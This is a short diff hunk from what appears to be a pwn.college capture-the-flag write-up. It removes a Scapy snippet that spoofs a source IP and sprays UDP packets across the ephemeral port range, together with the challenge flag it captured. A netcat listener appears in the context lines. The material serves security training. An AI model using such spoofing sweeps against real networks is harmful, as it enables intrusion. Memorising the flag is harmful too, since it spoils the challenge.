@@ -2097,18 +2097,6 @@ root@ip-10-0-0-1:/# nc -u -lvp 9999 &
 ```
 
 ```py
->>> from scapy.all import *
->>> 
->>> for port in range(32768, 61000):
-...     pkt = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / Raw(load="FLAG:10.0.0.1:9999")
-...     send(pkt, verbose=0)
-... 
-nc: getnameinfo: Temporary failure in name resolution
-pwn.college{gaHGS_2JwLNSOQCbFMznbkN_zzL.QX2QDM2EDL4ITM0EzW}
-```
-
-
-```py
 In [1]: from scapy.all import *
    ...: 
    ...: for port in range(32768, 61000):
